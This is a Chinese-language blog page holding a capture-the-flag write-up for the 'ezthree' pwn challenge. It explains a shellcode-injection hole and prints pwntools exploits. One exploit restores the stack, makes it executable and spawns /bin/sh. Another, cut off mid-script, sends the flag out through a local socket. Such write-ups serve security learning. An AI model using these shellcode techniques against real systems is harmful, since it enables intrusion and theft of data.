@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ezthree 复现 1GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et 1234➜  ezthree .&#x2F;ezthree INput &gt;&gt; yehllowcode &gt; 12346 over!!! 123456ezthree: ELF 64">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcode+socket本地进程通信">
+<meta property="og:url" content="http://example.com/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="ezthree 复现 1GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et 1234➜  ezthree .&#x2F;ezthree INput &gt;&gt; yehllowcode &gt; 12346 over!!! 123456ezthree: ELF 64">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/1656742003103.png">
+<meta property="og:image" content="http://example.com/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/1657196032861.png">
+<meta property="article:published_time" content="2022-07-07T12:30:59.000Z">
+<meta property="article:modified_time" content="2022-07-07T12:33:04.586Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="shellcode">
+<meta property="article:tag" content="socket">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/1656742003103.png">
+
+<link rel="canonical" href="http://example.com/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>shellcode+socket本地进程通信 | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          shellcode+socket本地进程通信
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-07-07 20:30:59 / Modified: 20:33:04" itemprop="dateCreated datePublished" datetime="2022-07-07T20:30:59+08:00">2022-07-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>7.2k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>7 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>ezthree 复现</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11<span class="number">.3</span>)</span> stable release version 2.23, by Roland McGrath et</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ezthree ./ezthree </span><br><span class="line">INput &gt;&gt; yehllow</span><br><span class="line">code &gt; <span class="number">12346</span> </span><br><span class="line">over!!!</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ezthree: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.23</span><span class="number">-0u</span>buntu11<span class="number">.3</span>_amd64/ld<span class="number">-2.23</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=a03fffb75b5c647383a7faca81d76966f05f7564, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<p>64位，dynamically，全开</p>
+<p><strong>代码分析</strong></p>
+<p>其实前面的代码都没有什么用，关键就是最后可以注入一个 shellcode</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( LODWORD(buf[<span class="number">5</span>]) )</span><br><span class="line">&#123;</span><br><span class="line">  output(<span class="string">&quot;You want to do sometings ?\n&quot;</span>);</span><br><span class="line">  read_s((<span class="keyword">char</span> *)shellcode + <span class="number">0xFD8</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(shellcode, overlap, <span class="number">0x3D</span>uLL);</span><br><span class="line">  shellcode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但执行该 shellcode 前，需要先执行以下代码：</p>
+<p><img src="/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/1656742003103.png" alt="1656742003103"> </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xf3e03346000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax rdi <span class="number">0xf3e03346000</span> ◂— <span class="keyword">xor</span>    rax, rax <span class="comment">/* 0xf7894c0bb0c03148 */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0xf3e03346008</span> ◂— mov    rsi, r15 <span class="comment">/* 0xc03148050ffe894c */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0xf3e03346010</span> ◂— <span class="keyword">xor</span>    rbx, rbx <span class="comment">/* 0x3148c93148db3148 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0xf3e03346018</span> ◂— ror    byte ptr [rax + <span class="number">0x31</span>], cl <span class="comment">/* 0x48f63148ff3148d2 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0xf3e03346020</span> ◂— <span class="keyword">xor</span>    ebp, ebp <span class="comment">/* 0xc0314de43148ed31 */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0xf3e03346028</span> ◂— <span class="keyword">xor</span>    r9, r9 <span class="comment">/* 0x314dd2314dc9314d */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0xf3e03346030</span> ◂— fisttp dword ptr [rbp + <span class="number">0x31</span>] <span class="comment">/* 0x4ded314de4314ddb */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0xf3e03346038</span> ◂— <span class="keyword">xor</span>    esi, esi <span class="comment">/* 0x909090ff314df631 */</span></span><br></pre></td></tr></table></figure>
+<p>限制点：常规寄存器全被清空（除了 RIP），尤其是 RSP，导致 shellcode 不能正常执行</p>
+<p>漏洞点：第一次 input 可以无限写入数据</p>
+<p><strong>入侵思路</strong></p>
+<p>在网上借鉴了其他大佬的 wp 后，我发现 <code>mov rsp, fs:[0x300]</code> 这条指令可以恢复栈，我的思路为：</p>
+<ul>
+<li>利用第一次 input 在栈上留下 execve(“/bin/sh” , 0 , 0) 的汇编代码（第二次 input 不够长）</li>
+<li>mprotect(rsp , 0x1000 , 7) 使栈获取执行权限</li>
+<li>jmp rsp + jmp $+0x32 执行栈上的 execve(“/bin/sh” , 0 , 0)</li>
+</ul>
+<p>完整 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./ezthree&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./ezthree&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;ret&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zero</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;zero&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nop</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;nop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jmp</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;jmp&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movrax</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;movrax&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x185E)\n&quot;)</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		jmp $+0x32</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line">	</span><br><span class="line">shellcode+=<span class="string">&quot;&quot;</span>.ljust(<span class="number">0x30</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode+=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov r8 ,rsp</span></span><br><span class="line"><span class="string">        ADD r8 ,0x4b</span></span><br><span class="line"><span class="string">		mov rax, 59</span></span><br><span class="line"><span class="string">		xor rdx, rdx</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">		mov rdi, r8</span></span><br><span class="line"><span class="string">		syscall	</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode+=<span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">shell=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		mov rsp, fs:[0x300]</span></span><br><span class="line"><span class="string">		push 0x1000</span></span><br><span class="line"><span class="string">		pop rsi</span></span><br><span class="line"><span class="string">		push 7</span></span><br><span class="line"><span class="string">		pop rdx</span></span><br><span class="line"><span class="string">		push 0xA</span></span><br><span class="line"><span class="string">		pop rax</span></span><br><span class="line"><span class="string">		mov rdi, rsp</span></span><br><span class="line"><span class="string">		and rdi, 0xFFFFFFFFFFFFF000</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		sub rsp,0x67</span></span><br><span class="line"><span class="string">		jmp rsp</span></span><br><span class="line"><span class="string">	&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.send(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffd20125212</span>    syscall  &lt;SYS_execve&gt;</span><br><span class="line">       path: <span class="number">0x7ffd20125214</span> ◂— <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line">       argv: <span class="number">0x0</span></span><br><span class="line">       envp: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ni</span><br><span class="line">process <span class="number">8910</span> is executing <span class="keyword">new</span> program: /usr/bin/dash</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint <span class="number">2.</span></span><br><span class="line">Cannot access memory at address <span class="number">0x42f10b76fd8</span></span><br><span class="line">Cannot insert breakpoint <span class="number">1.</span></span><br><span class="line">Cannot access memory at address <span class="number">0x559debc0185e</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>虽然获取 shell 了，但是有个无法避免的报错</li>
+</ul>
+<p>直接 get shell 不行，我便想试试 ORW，但又有一个问题：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">close(<span class="number">0</span>);</span><br><span class="line">close(<span class="number">1</span>);</span><br><span class="line">close(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>close 0 1 2，必然要找其他通信方式</li>
+</ul>
+<p>网上有一个大佬采用自己创建 socket 管道去通信，orw flag 发送</p>
+<p>关于 socket 通信可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u010073981/article/details/50734484">Linux socket 本地进程间通信</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff329758b5</span>    syscall  &lt;SYS_socket&gt;</span><br><span class="line">       domain: <span class="number">0x1</span></span><br><span class="line">       type: <span class="number">0x1</span></span><br><span class="line">       protocol: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff329758d5</span>    syscall  &lt;SYS_connect&gt;</span><br><span class="line">       fd: <span class="number">0x0</span> (socket:[<span class="number">159357</span>])</span><br><span class="line">       addr: <span class="number">0x7fff32975889</span> ◂— <span class="number">0x420001</span> <span class="comment">// serv_addr </span></span><br><span class="line">       len: <span class="number">0x10</span></span><br></pre></td></tr></table></figure>
+<p>关键点就是 <code>SYS_socket</code> 和 <code>SYS_connect</code> ，执行完这两个函数后，就可以开始 ORW 了：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff3297591e</span>    syscall  &lt;SYS_open&gt;</span><br><span class="line">       file: <span class="number">0x7fff32975881</span> ◂— <span class="number">0x67616c66</span> <span class="comment">/* &#x27;flag&#x27; */</span></span><br><span class="line">       oflag: <span class="number">0x0</span></span><br><span class="line">       vararg: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff3297592f</span>    syscall  &lt;SYS_read&gt;</span><br><span class="line">       fd: <span class="number">0x1</span> (/home/yhellow/桌面/ezthree/flag)</span><br><span class="line">       buf: <span class="number">0x7fff32975881</span> ◂— <span class="number">0x67616c66</span> <span class="comment">/* &#x27;flag&#x27; */</span></span><br><span class="line">       nbytes: <span class="number">0x50</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fff3297593b</span>    syscall  &lt;SYS_write&gt;</span><br><span class="line">       fd: <span class="number">0x0</span> (socket:[<span class="number">159357</span>])</span><br><span class="line">       buf: <span class="number">0x7fff32975881</span> ◂— <span class="string">&#x27;flag&#123;yhellow&#125;\n&#x27;</span></span><br><span class="line">       n: <span class="number">0x50</span></span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<p><img src="/2022/07/07/shellcode+socket%E6%9C%AC%E5%9C%B0%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1/1657196032861.png" alt="1657196032861">  </p>
+<p>完整 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./ezthree&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;ret&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zero</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;zero&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nop</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;nop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jmp</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;jmp&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movrax</span>(<span class="params">addr</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;code &gt; &quot;</span>,<span class="string">&quot;movrax&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x185E)&quot;)</span></span><br><span class="line"></span><br><span class="line">serv_addr = <span class="number">0x420001</span> <span class="comment"># serv_addr</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">		mov rax, 41</span></span><br><span class="line"><span class="string">		mov rdi, 1</span></span><br><span class="line"><span class="string">		mov rsi, 1</span></span><br><span class="line"><span class="string">		mov rdx, 0</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		push 0</span></span><br><span class="line"><span class="string">		mov rcx, 0x420001</span></span><br><span class="line"><span class="string">		push rcx</span></span><br><span class="line"><span class="string">		mov rsi, rsp</span></span><br><span class="line"><span class="string">		xor rdi, rdi</span></span><br><span class="line"><span class="string">		mov rax, 42</span></span><br><span class="line"><span class="string">		mov rdx, 0x10</span></span><br><span class="line"><span class="string">		syscall</span></span><br><span class="line"><span class="string">		jmp $+0x32</span></span><br><span 